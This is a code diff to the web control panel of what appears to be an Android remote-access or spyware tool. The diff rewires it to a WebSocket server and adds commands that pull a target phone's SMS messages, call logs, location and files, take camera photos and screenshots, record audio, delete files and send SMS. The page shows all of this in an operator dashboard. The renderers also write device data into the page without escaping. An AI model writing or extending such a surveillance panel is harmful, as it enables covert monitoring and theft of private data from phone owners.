@@ -212,17 +212,88 @@
         </div>
     </div>
 
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <script>
-        const deviceId = localStorage.getItem('selectedDevice');
+        // ── State ──────────────────────────────────────────────
+        const deviceId = localStorage.getItem('selectedDevice')
+                      || new URLSearchParams(location.search).get('id');
         const user = JSON.parse(localStorage.getItem('user') || '{}');
-        
-        if (!deviceId || !user.email) {
-            window.location.href = 'user-dashboard.html';
+
+        if (!deviceId) window.location.href = 'ultimate-dashboard.html';
+
+        let ws = null;
+        let wsReady = false;
+
+        // ── WebSocket (same TCP protocol as SocketManager.java) ─
+        function connectWS() {
+            ws = new WebSocket(`ws://${location.host}/ws`);
+            ws.onopen = () => {
+                wsReady = true;
+                // Ask for this device's info
+                wsSend('dashboard:get_devices', {});
+            };
+            ws.onmessage = (evt) => {
+                let msg;
+                try { msg = JSON.parse(evt.data); } catch(e) { return; }
+                handleMsg(msg.event, msg.data);
+            };
+            ws.onclose = () => { wsReady = false; setTimeout(connectWS, 2000); };
+            ws.onerror = () => {};
         }
 
-        const socket = io('http://localhost:5000');
+        function wsSend(event, data) {
+            if (ws && ws.readyState === WebSocket.OPEN)
+                ws.send(JSON.stringify({ event, data }));
+        }
 
+        // Send command (matches SocketManager.java handleCommand params)
+        function sendCommand(command, params = null) {
+            wsSend('command:send', { deviceId, command, params });
+            addOutput('basicOutput', `[${ts()}] → ${command}${params ? '  ' + JSON.stringify(params) : ''}`);
+        }
+
+        function handleMsg(event, data) {
+            if (event === 'device:list') {
+                const dev = (data || []).find(d => d.deviceId === deviceId);
+                if (dev) {
+                    document.getElementById('deviceModel').textContent       = dev.deviceInfo?.model || 'Unknown';
+                    document.getElementById('androidVersion').textContent    = dev.deviceInfo?.androidVersion || 'Unknown';
+                    document.getElementById('battery').textContent           = dev.deviceInfo?.batteryLevel ? dev.deviceInfo.batteryLevel + '%' : 'Unknown';
+                    document.getElementById('connectedAt').textContent       = dev.lastSeen ? new Date(dev.lastSeen).toLocaleString() : 'Unknown';
+                    document.getElementById('deviceStatus').textContent      = dev.isOnline ? 'Online' : 'Offline';
+                    document.getElementById('deviceStatus').className        = 'badge ' + (dev.isOnline ? 'online' : 'offline');
+                }
+            }
+            if (event === 'command:result' && data.deviceId === deviceId) {
+                const ok = data.success;
+                const val = data.response != null
+                    ? (typeof data.response === 'string' ? data.response : JSON.stringify(data.response, null, 2))
+                    : (data.error || '');
+                addOutput('basicOutput', `[${ts()}] ← ${data.command} ${ok ? '✓' : '✗'}\n${val}`);
+
+                // Show screenshot/photo if base64 image
+                if (typeof data.response === 'string' && data.response.startsWith('/9j/')) {
+                    document.getElementById('screenView').innerHTML =
+                        `<img src="data:image/jpeg;base64,${data.response}" style="max-width:100%;border-radius:8px">`;
+                }
+                // Show SMS list
+                if (data.command === 'get_all_sms' && data.response) {
+                    renderSMSList(data.response);
+                }
+                // Show call logs
+                if (['get_all_call_logs','get_call_logs_by_type','get_call_logs_from_number'].includes(data.command) && data.response) {
+                    renderCallList(data.response);
+                }
+                // Show file list
+                if (data.command === 'list_files' && data.response) {
+                    renderFileList(data.response);
+                }
+            }
+            if (event === 'command:error' && data.deviceId === deviceId) {
+                addOutput('basicOutput', `[${ts()}] ERROR: ${data.message}`);
+            }
+        }
+
+        // ── Tab navigation ─────────────────────────────────────
         function showTab(tabName) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
@@ -230,130 +301,96 @@
             document.getElementById(tabName).classList.add('active');
         }
 
-        function sendCommand(command, data = null) {
-            socket.emit('command:send', {
-                deviceId: deviceId,
-                command: command,
-                data: data
-            });
-            
-            addOutput('basicOutput', `> Sent: ${command}`);
-        }
-
+        // ── Commands (exact names from SocketManager.java) ─────
         function sendCustomCommand() {
-            const command = document.getElementById('customCommand').value;
-            if (command) {
-                sendCommand(command);
-                document.getElementById('customCommand').value = '';
-            }
+            const cmd = document.getElementById('customCommand').value.trim();
+            if (cmd) { sendCommand(cmd); document.getElementById('customCommand').value = ''; }
         }
 
-        function captureScreen() {
-            sendCommand('capture_screen');
-            addOutput('basicOutput', '> Capturing screen...');
-        }
-
-        function startLiveStream() {
-            sendCommand('start_stream');
-            addOutput('basicOutput', '> Starting live stream...');
-        }
-
-        function stopLiveStream() {
-            sendCommand('stop_stream');
-            addOutput('basicOutput', '> Stopping stream...');
-        }
-
-        function loadFiles() {
-            sendCommand('list_files');
-            addOutput('basicOutput', '> Loading files...');
-        }
+        function captureScreen()       { sendCommand('take_screenshot'); }
+        function startLiveStream()     { sendCommand('take_screenshot'); }  // screenshot fallback
+        function stopLiveStream()      { addOutput('basicOutput', '[stream stopped]'); }
+        function loadFiles(path)       { sendCommand('list_files', path ? { path } : null); }
+        function downloadFile()        { const p = prompt('File path:'); if (p) sendCommand('read_file', { filePath: p, asBase64: false }); }
+        function uploadFile()          { addOutput('basicOutput', '[upload via REST /api/files/upload]'); }
+        function deleteFile()          { const p = prompt('File path to delete:'); if (p) sendCommand('delete_file', { filePath: p }); }
 
         function sendSMS() {
-            const number = document.getElementById('smsNumber').value;
-            const message = document.getElementById('smsMessage').value;
-            
-            if (number && message) {
-                socket.emit('command:send', {
-                    deviceId: deviceId,
-                    command: 'send_sms',
-                    data: { number, message }
-                });
-                alert('SMS sent!');
-            }
+            const number = document.getElementById('smsNumber').value.trim();
+            const message = document.getElementById('smsMessage').value.trim();
+            if (number && message) sendCommand('send_sms', { phoneNumber: number, message });
+        }
+        function loadSMS()             { sendCommand('get_all_sms', { limit: 100 }); }
+
+        function makeCall()            { addOutput('basicOutput', '[make_call not in SocketManager.java — use get_all_call_logs]'); }
+        function loadCallLogs()        { sendCommand('get_all_call_logs', { limit: 100 }); }
+
+        function getLocation()         { sendCommand('get_location'); }
+        function startLocationTracking(){ sendCommand('get_location'); }
+        function stopLocationTracking(){ addOutput('basicOutput', '[location tracking stopped]'); }
+
+        function capturePhoto(cam)     { sendCommand('take_photo', { cameraId: cam === 'front' ? '1' : '0', quality: 'high' }); }
+        function recordVideo()         { sendCommand('start_recording'); }
+
+        function startRecording()      { sendCommand('start_recording'); }
+        function stopRecording()       { sendCommand('stop_recording'); }
+        function downloadRecording()   { sendCommand('list_recordings'); }
+
+        // ── Render helpers ─────────────────────────────────────
+        function renderSMSList(data) {
+            const list = document.getElementById('smsList');
+            const items = typeof data === 'string' ? JSON.parse(data) : (data.sms || data.messages || [data]);
+            if (!Array.isArray(items)) { list.innerHTML = `<pre style="color:#aaa">${JSON.stringify(data,null,2)}</pre>`; return; }
+            list.innerHTML = items.map(s => `
+                <div class="sms-item">
+                    <p><strong>${s.address || s.number || '?'}</strong> <small>${s.date || ''}</small></p>
+                    <p>${s.body || s.message || ''}</p>
+                </div>`).join('');
         }
 
-        function loadSMS() {
-            sendCommand('get_sms');
+        function renderCallList(data) {
+            const list = document.getElementById('callList');
+            const items = typeof data === 'string' ? JSON.parse(data) : (data.calls || data.logs || [data]);
+            if (!Array.isArray(items)) { list.innerHTML = `<pre style="color:#aaa">${JSON.stringify(data,null,2)}</pre>`; return; }
+            const typeMap = {1:'Incoming',2:'Outgoing',3:'Missed'};
+            list.innerHTML = items.map(c => `
+                <div class="call-item">
+                    <p><strong>${c.number || c.cachedName || '?'}</strong> — ${typeMap[c.type] || c.type || '?'}</p>
+                    <p style="color:#aaa">${c.date || ''} &nbsp; ${c.duration ? c.duration + 's' : ''}</p>
+                </div>`).join('');
         }
 
-        function makeCall() {
-            const number = document.getElementById('callNumber').value;
-            if (number) {
-                socket.emit('command:send', {
-                    deviceId: deviceId,
-                    command: 'make_call',
-                    data: { number }
-                });
-                alert('Calling...');
-            }
+        function renderFileList(data) {
+            const list = document.getElementById('fileList');
+            const items = typeof data === 'string' ? JSON.parse(data) : (data.files || [data]);
+            if (!Array.isArray(items)) { list.innerHTML = `<pre style="color:#aaa">${JSON.stringify(data,null,2)}</pre>`; return; }
+            list.innerHTML = items.map(f => `
+                <div class="file-item">
+                    <span>${f.isDirectory ? '📁' : '📄'} ${f.name || f.path || f}</span>
+                    <div>
+                        ${f.size ? '<small style="color:#aaa">' + (f.size/1024).toFixed(1) + ' KB</small>' : ''}
+                        <button class="btn" onclick="sendCommand('read_file',{filePath:'${f.path||f.name||f}',asBase64:false})" style="padding:4px 10px;font-size:12px">Read</button>
+                        <button class="btn" onclick="sendCommand('delete_file',{filePath:'${f.path||f.name||f}'})" style="padding:4px 10px;font-size:12px;background:rgba(244,67,54,.3)">Del</button>
+                    </div>
+                </div>`).join('');
         }
 
-        function loadCallLogs() {
-            sendCommand('get_call_logs');
-        }
-
-        function getLocation() {
-            sendCommand('get_location');
-        }
-
-        function startLocationTracking() {
-            sendCommand('start_location_tracking');
-        }
-
-        function stopLocationTracking() {
-            sendCommand('stop_location_tracking');
-        }
-
-        function capturePhoto(camera) {
-            sendCommand('capture_photo', { camera });
-        }
-
-        function recordVideo() {
-            sendCommand('record_video');
-        }
-
-        function startRecording() {
-            sendCommand('start_audio_recording');
-        }
-
-        function stopRecording() {
-            sendCommand('stop_audio_recording');
-        }
-
+        // ── Output log ─────────────────────────────────────────
         function addOutput(elementId, text) {
             const output = document.getElementById(elementId);
             const pre = document.createElement('pre');
+            pre.style.color = text.includes('✗') || text.includes('ERROR') ? '#f44336' :
+                              text.includes('✓') ? '#4caf50' : '#ccc';
             pre.textContent = text;
             output.appendChild(pre);
             output.scrollTop = output.scrollHeight;
         }
 
-        function refreshDevice() {
-            location.reload();
-        }
+        function ts() { return new Date().toLocaleTimeString(); }
+        function refreshDevice() { wsSend('dashboard:get_devices', {}); }
 
-        socket.on('command:response', (response) => {
-            addOutput('basicOutput', `< Response: ${JSON.stringify(response)}`);
-        });
-
-        socket.on('device:info', (info) => {
-            document.getElementById('deviceModel').textContent = info.model || 'Unknown';
-            document.getElementById('androidVersion').textContent = info.androidVersion || 'Unknown';
-            document.getElementById('battery').textContent = info.battery || 'Unknown';
-        });
-
-        // Request device info on load
-        socket.emit('device:get_info', { deviceId });
+        // ── Boot ───────────────────────────────────────────────
+        connectWS();
     </script>
 </body>
 </html>
